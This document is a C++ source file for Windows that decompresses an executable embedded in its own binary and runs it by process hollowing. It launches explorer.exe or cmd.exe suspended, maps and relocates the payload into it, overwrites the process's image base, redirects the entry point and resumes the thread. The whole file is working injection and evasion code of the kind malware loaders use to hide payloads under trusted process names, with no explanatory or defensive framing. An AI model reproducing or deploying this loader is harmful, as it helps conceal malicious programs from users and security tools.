#include "stdafx.h"

EXTERN_C extern UCHAR codesec_exe_begin[], codesec_exe_end[];

NTSTATUS FindNoCfgDll(_In_ ULONG SizeOfImage, _Out_ PHANDLE SectionHandle);

void CopyImage(PVOID BaseAddress, PVOID BaseOfImage, PIMAGE_NT_HEADERS pinth)
{
	memcpy(BaseAddress, BaseOfImage, pinth->OptionalHeader.SizeOfHeaders);

	if (ULONG NumberOfSections = pinth->FileHeader.NumberOfSections)
	{
		PIMAGE_SECTION_HEADER pish = IMAGE_FIRST_SECTION(pinth);

		do 
		{
			if (ULONG cb = min(pish->Misc.VirtualSize, pish->SizeOfRawData))
			{
				memcpy((PBYTE)BaseAddress + pish->VirtualAddress, (PBYTE)BaseOfImage + pish->PointerToRawData, cb);
			}
		} while (pish++, --NumberOfSections);
	}
}

void Relocate(PVOID BaseAddress, LONG_PTR RemoteBase)
{
	ULONG size;

	union {
		PVOID pv;
		PBYTE pb;
		PIMAGE_BASE_RELOCATION pibr;
	};

	PULONG_PTR pImageBase = &RtlImageNtHeader(BaseAddress)->OptionalHeader.ImageBase;
	LONG_PTR Delta = RemoteBase - *pImageBase;
	*pImageBase = RemoteBase;

	if (pv = RtlImageDirectoryEntryToData(BaseAddress, TRUE, IMAGE_DIRECTORY_ENTRY_BASERELOC, &size))
	{
		ULONG SizeOfBlock;
		do 
		{
			SizeOfBlock = pibr->SizeOfBlock;

			pibr = LdrProcessRelocationBlock((PBYTE)BaseAddress + pibr->VirtualAddress, 
				(SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) >> 1, (PUSHORT)(pibr + 1), Delta);

		} while (size -= SizeOfBlock);
	}
}

NTSTATUS ProtectImage(HANDLE hProcess, PVOID RemoteBase, PIMAGE_NT_HEADERS pinth)
{
	if (ULONG NumberOfSections = pinth->FileHeader.NumberOfSections)
	{
		PIMAGE_SECTION_HEADER pish = IMAGE_FIRST_SECTION(pinth);

		do 
		{
			if (ULONG VirtualSize = pish->Misc.VirtualSize)
			{
				ULONG NewProtect = PAGE_NOACCESS;

				switch (pish->Characteristics & (IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_WRITE|IMAGE_SCN_MEM_READ))
				{
				case IMAGE_SCN_MEM_READ:
					NewProtect = PAGE_READONLY;
					break;

				case IMAGE_SCN_MEM_EXECUTE:
					NewProtect = PAGE_EXECUTE;
					break;

				case IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_READ:
					NewProtect = PAGE_EXECUTE_READ;
					break;

				case IMAGE_SCN_MEM_WRITE:
				case IMAGE_SCN_MEM_WRITE|IMAGE_SCN_MEM_READ:
					NewProtect = PAGE_READWRITE;
					break;

				case IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_WRITE:
				case IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_WRITE|IMAGE_SCN_MEM_READ:
					NewProtect = PAGE_EXECUTE_READWRITE;
					break;
				}

				if (!VirtualProtectEx(hProcess, (PBYTE)RemoteBase + pish->VirtualAddress, VirtualSize, NewProtect, &VirtualSize))
				{
					return RtlGetLastNtStatus();
				}
			}
		} while (pish++, --NumberOfSections);
	}

	return STATUS_SUCCESS;
}

#ifdef _AMD64_
	#define EP_REG Rcx
#elif defined(_X86_)
	#define EP_REG Eax
#else
	#error target architecture not supported
#endif

void Inject(PVOID BaseOfImage, ULONG SizeOfImage, PCWSTR lpCommandLine = 0)
{
	PIMAGE_NT_HEADERS pinth;
	if (0 <= RtlImageNtHeaderEx(0, BaseOfImage, SizeOfImage, &pinth) &&
		pinth->FileHeader.Machine == RtlImageNtHeader(&__ImageBase)->FileHeader.Machine)
	{
		PCWSTR lpFileName;
		switch (pinth->OptionalHeader.Subsystem)
		{
		case IMAGE_SUBSYSTEM_WINDOWS_GUI:
			lpFileName = L"explorer.exe";
			break;
		case IMAGE_SUBSYSTEM_WINDOWS_CUI:
			lpFileName = L"cmd.exe";
			break;
		default:
			return ;
		}

		WCHAR ApplicationName[MAX_PATH];
		if (SearchPathW(0, lpFileName, 0, _countof(ApplicationName), ApplicationName, 0))
		{
			HANDLE hSection;

			if (0 <= FindNoCfgDll(SizeOfImage = pinth->OptionalHeader.SizeOfImage, &hSection))
			{
				SIZE_T ViewSize = 0;
				PVOID BaseAddress = 0;

				if (0 <= ZwMapViewOfSection(hSection, NtCurrentProcess(), &BaseAddress, 
					0, 0, 0, &ViewSize, ViewUnmap, 0, PAGE_NOACCESS))
				{
					ULONG op;
					if (VirtualProtect(BaseAddress, SizeOfImage, PAGE_READWRITE, &op))
					{
						RtlZeroMemory(BaseAddress, SizeOfImage);

						CopyImage(BaseAddress, BaseOfImage, pinth);

						STARTUPINFO si = { sizeof(si) };
						PROCESS_INFORMATION pi;

						if (CreateProcessW(ApplicationName, const_cast<PWSTR>(lpCommandLine),
							0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi))
						{
							CONTEXT ctx{};
							ctx.ContextFlags = CONTEXT_INTEGER;

							PROCESS_BASIC_INFORMATION pbi;
							PVOID ImageBaseAddress;

							PVOID RemoteBase = 0;
							ViewSize = SizeOfImage;
							BOOL fOk = FALSE;

							if (0 <= NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), 0) &&
								GetThreadContext(pi.hThread, &ctx) &&
								0 <= NtReadVirtualMemory(pi.hProcess,
									&reinterpret_cast<_PEB*>(pbi.PebBaseAddress)->ImageBaseAddress,
									&ImageBaseAddress, sizeof(ImageBaseAddress), 0) &&
								0 <= ZwMapViewOfSection(hSection, pi.hProcess, &RemoteBase, 0, 0, 0, &ViewSize, ViewShare, 0, PAGE_READONLY))
							{
								Relocate(BaseAddress, (LONG_PTR)RemoteBase);

								ctx.EP_REG = (ULONG_PTR)RemoteBase + pinth->OptionalHeader.AddressOfEntryPoint;

								fOk = VirtualProtectEx(pi.hProcess, RemoteBase, SizeOfImage, PAGE_READWRITE, &op) &&
									0 <= NtWriteVirtualMemory(pi.hProcess, RemoteBase, BaseAddress, SizeOfImage, 0) &&
									0 <= ProtectImage(pi.hProcess, RemoteBase, pinth) &&
									0 <= NtWriteVirtualMemory(pi.hProcess,
										&reinterpret_cast<_PEB*>(pbi.PebBaseAddress)->ImageBaseAddress,
										&RemoteBase, sizeof(RemoteBase), 0) &&
									0 <= NtSetContextThread(pi.hThread, &ctx) &&
									0 <= NtResumeThread(pi.hThread, 0);
							}

							if (!fOk)
							{
								TerminateProcess(pi.hProcess, 0);
							}

							NtClose(pi.hThread);
							NtClose(pi.hProcess);
						}
					}

					ZwUnmapViewOfSection(NtCurrentProcess(), BaseAddress);
				}

				NtClose(hSection);
			}
		}
	}
}

ULONG Unzip(_In_ LPCVOID CompressedData,
	_In_ ULONG CompressedDataSize,
	_Out_ PVOID* pUncompressedBuffer,
	_Out_ ULONG* pUncompressedDataSize);

void WINAPI ep(PVOID pv)
{
	pv = codesec_exe_begin;
	
	ULONG cb = RtlPointerToOffset(codesec_exe_begin, codesec_exe_end);
	
	if (NOERROR == Unzip(pv, cb, &pv, &cb))
	{
		Inject(pv, cb);
		LocalFree(pv);
	}
	
	ExitProcess(0);
}
